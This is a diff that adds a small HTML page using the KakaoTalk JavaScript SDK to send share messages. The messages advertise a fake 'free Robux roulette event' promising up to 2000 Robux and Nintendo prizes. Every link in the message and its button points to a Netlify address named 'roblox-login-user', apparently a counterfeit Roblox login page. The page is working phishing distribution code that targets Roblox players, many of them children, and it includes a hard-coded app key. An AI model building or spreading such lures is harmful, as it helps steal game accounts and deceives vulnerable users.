@@ -1,0 +1,41 @@
+<html>
+<head>
+<title>카카오톡 버튼있는 메시지 전송하기</title>
+<script id="javascript-sdk" src="https://developers.kakao.com/sdk/js/kakao.min.js"></script>
+</head>
+<body>
+<p><strong>아래 카카오톡 아이콘을 눌러 전송하세요</strong> By. Blackcats4567</p>
+<a id="kakao-link-btn" href="javascript:sendLink()">
+  <img
+    src="https://developers.kakao.com/assets/img/about/logos/kakaolink/kakaolink_btn_medium.png"
+  />
+</a>
+<script type="text/javascript">
+ Kakao.init('5e5d0b9bc8e91a39ed1761f0ef722460');
+  function sendLink() {
+    Kakao.Link.sendDefault({
+      objectType: 'feed',
+      content: {
+        title: '최대 2000로벅스를 무료로? 로벅스 룰렛 이벤트!',
+        description: '룰렛만 돌려도 닌텐도와 로벅스가?',
+        imageUrl:
+          'http://k.kakaocdn.net/dn/cBTClT/btrS60t2tO9/dZtiLEZW0APZUpdLvtKKUK/kakaolink40_original.png',
+        link: {
+          mobileWebUrl: 'https://roblox-login-user.netlify.app',
+          webUrl: 'https://roblox-login-user.netlify.app',
+        },
+      },
+      buttons: [
+        {
+          title: '룰렛 돌리기',
+          link: {
+            mobileWebUrl: 'https://roblox-login-user.netlify.app',
+            webUrl: 'https://roblox-login-user.netlify.app',
+          },
+        },
+      ],
+    })
+  }
+</script>
+  </body>
+</html>
